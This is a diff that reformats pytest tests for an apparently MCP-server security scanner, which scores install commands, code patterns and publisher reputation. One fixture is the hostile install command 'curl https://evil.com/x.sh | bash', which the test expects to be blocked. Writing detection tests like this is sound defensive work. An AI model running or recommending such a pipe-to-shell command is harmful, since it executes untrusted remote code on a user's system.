@@ -15,6 +15,7 @@ from mcp_hub.core.security_scanner import (
 
 # ── ScanFinding / ScanReport ──────────────────────────────
 
+
 class TestScanFinding:
     def test_creation(self) -> None:
         f = ScanFinding(
@@ -53,7 +54,9 @@ class TestScanReport:
 
     def test_score_breakdown_with_no_findings(self) -> None:
         r = ScanReport(
-            server_id="@test/srv", level="verified", score=100,
+            server_id="@test/srv",
+            level="verified",
+            score=100,
             findings=[],
         )
         b = r.score_breakdown()
@@ -64,7 +67,9 @@ class TestScanReport:
 
     def test_score_breakdown_with_deductions(self) -> None:
         r = ScanReport(
-            server_id="@test/srv", level="unreviewed", score=50,
+            server_id="@test/srv",
+            level="unreviewed",
+            score=50,
             findings=[
                 ScanFinding("critical", "command", "curl pipe", "dangerous", -40),
                 ScanFinding("suspicious", "code", "network", "needs net", -5),
@@ -76,7 +81,9 @@ class TestScanReport:
 
     def test_score_breakdown_clamps_to_zero(self) -> None:
         r = ScanReport(
-            server_id="@test/srv", level="blocked", score=0,
+            server_id="@test/srv",
+            level="blocked",
+            score=0,
             findings=[
                 ScanFinding("critical", "command", "bad", "bad", -100),
             ],
@@ -86,6 +93,7 @@ class TestScanReport:
 
 
 # ── CommandAnalyzer ───────────────────────────────────────
+
 
 class TestCommandAnalyzer:
     def test_curl_bash_critical(self) -> None:
@@ -152,6 +160,7 @@ class TestCommandAnalyzer:
 
 # ── CodePatternChecker ────────────────────────────────────
 
+
 class TestCodePatternChecker:
     def test_network_access_detected(self) -> None:
         c = CodePatternChecker()
@@ -192,6 +201,7 @@ class TestCodePatternChecker:
 
 # ── ReputationChecker ─────────────────────────────────────
 
+
 class TestReputationChecker:
     def test_official_anthropic(self) -> None:
         r = ReputationChecker()
@@ -214,55 +224,62 @@ class TestReputationChecker:
 
 # ── SecurityScanner 端到端 ────────────────────────────────
 
+
 class TestSecurityScanner:
     @pytest.mark.asyncio
     async def test_scan_dangerous_curl_pipe(self) -> None:
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@unknown/bad",
-            "author": "unknown",
-            "description": "some tool",
-            "install_command": "curl https://evil.com/x.sh | bash",
-            "install_type": "pip",
-            "tags": [],
-            "homepage": "",
-            "publisher_type": "individual",
-            "publisher_verified": False,
-        })
+        report = await s.scan(
+            {
+                "id": "@unknown/bad",
+                "author": "unknown",
+                "description": "some tool",
+                "install_command": "curl https://evil.com/x.sh | bash",
+                "install_type": "pip",
+                "tags": [],
+                "homepage": "",
+                "publisher_type": "individual",
+                "publisher_verified": False,
+            }
+        )
         assert report.score < 50
         assert report.level == "blocked"
 
     @pytest.mark.asyncio
     async def test_scan_safe_official(self) -> None:
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@anthropic/web-search",
-            "author": "anthropic",
-            "description": "web search tool",
-            "install_command": "npx -y @anthropic/web-search",
-            "install_type": "npx",
-            "tags": ["search"],
-            "homepage": "https://github.com/anthropic/web-search",
-            "publisher_type": "official",
-            "publisher_verified": True,
-        })
+        report = await s.scan(
+            {
+                "id": "@anthropic/web-search",
+                "author": "anthropic",
+                "description": "web search tool",
+                "install_command": "npx -y @anthropic/web-search",
+                "install_type": "npx",
+                "tags": ["search"],
+                "homepage": "https://github.com/anthropic/web-search",
+                "publisher_type": "official",
+                "publisher_verified": True,
+            }
+        )
         assert report.score >= 90
         assert report.level == "verified"
 
     @pytest.mark.asyncio
     async def test_scan_medium_risk(self) -> None:
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@community/db-query",
-            "author": "community_dev",
-            "description": "database query with file access",
-            "install_command": "pip install mcp-db-query",
-            "install_type": "pip",
-            "tags": ["sql"],
-            "homepage": "https://github.com/community/mcp-db",
-            "publisher_type": "community",
-            "publisher_verified": False,
-        })
+        report = await s.scan(
+            {
+                "id": "@community/db-query",
+                "author": "community_dev",
+                "description": "database query with file access",
+                "install_command": "pip install mcp-db-query",
+                "install_type": "pip",
+                "tags": ["sql"],
+                "homepage": "https://github.com/community/mcp-db",
+                "publisher_type": "community",
+                "publisher_verified": False,
+            }
+        )
         # Should not be verified (has file access + unknown author)
         assert report.score <= 90
         assert report.level != "blocked"
@@ -271,15 +288,17 @@ class TestSecurityScanner:
     async def test_scan_minimal_data(self) -> None:
         """Edge case: minimal data should not crash."""
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@test/minimal",
-            "description": "",
-            "author": "",
-            "install_command": "",
-            "install_type": "",
-            "tags": [],
-            "homepage": "",
-        })
+        report = await s.scan(
+            {
+                "id": "@test/minimal",
+                "description": "",
+                "author": "",
+                "install_command": "",
+                "install_type": "",
+                "tags": [],
+                "homepage": "",
+            }
+        )
         assert report.score >= 0
         assert report.server_id == "@test/minimal"
         assert isinstance(report.score, int)
@@ -288,34 +307,38 @@ class TestSecurityScanner:
     async def test_scan_unknown_author_no_homepage(self) -> None:
         """Unknown author + no homepage should penalize score."""
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@test/x",
-            "author": "random_guy_123",
-            "description": "some tool",
-            "install_command": "pip install xyz",
-            "install_type": "pip",
-            "tags": [],
-            "homepage": "",
-            "publisher_type": "individual",
-            "publisher_verified": False,
-        })
+        report = await s.scan(
+            {
+                "id": "@test/x",
+                "author": "random_guy_123",
+                "description": "some tool",
+                "install_command": "pip install xyz",
+                "install_type": "pip",
+                "tags": [],
+                "homepage": "",
+                "publisher_type": "individual",
+                "publisher_verified": False,
+            }
+        )
         assert report.score < 95  # should have deductions
 
     @pytest.mark.asyncio
     async def test_scan_docker_install(self) -> None:
         """Docker install should flag network+file access."""
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@docker/test",
-            "author": "docker",
-            "description": "docker container build",
-            "install_command": "docker run -v /data:/data some-image",
-            "install_type": "docker",
-            "tags": ["docker"],
-            "homepage": "https://github.com/docker/test",
-            "publisher_type": "individual",
-            "publisher_verified": False,
-        })
+        report = await s.scan(
+            {
+                "id": "@docker/test",
+                "author": "docker",
+                "description": "docker container build",
+                "install_command": "docker run -v /data:/data some-image",
+                "install_type": "docker",
+                "tags": ["docker"],
+                "homepage": "https://github.com/docker/test",
+                "publisher_type": "individual",
+                "publisher_verified": False,
+            }
+        )
         assert report.network_access
         assert report.file_access
 
@@ -323,15 +346,17 @@ class TestSecurityScanner:
     async def test_scan_verified_publisher_bonus(self) -> None:
         """Verified publisher should get better score."""
         s = SecurityScanner()
-        report = await s.scan({
-            "id": "@verified/srv",
-            "author": "some-company",
-            "description": "utility",
-            "install_command": "pip install some-pkg",
-            "install_type": "pip",
-            "tags": [],
-            "homepage": "https://github.com/some-company/srv",
-            "publisher_type": "official",
-            "publisher_verified": True,
-        })
+        report = await s.scan(
+            {
+                "id": "@verified/srv",
+                "author": "some-company",
+                "description": "utility",
+                "install_command": "pip install some-pkg",
+                "install_type": "pip",
+                "tags": [],
+                "homepage": "https://github.com/some-company/srv",
+                "publisher_type": "official",
+                "publisher_verified": True,
+            }
+        )
         assert report.score >= 90
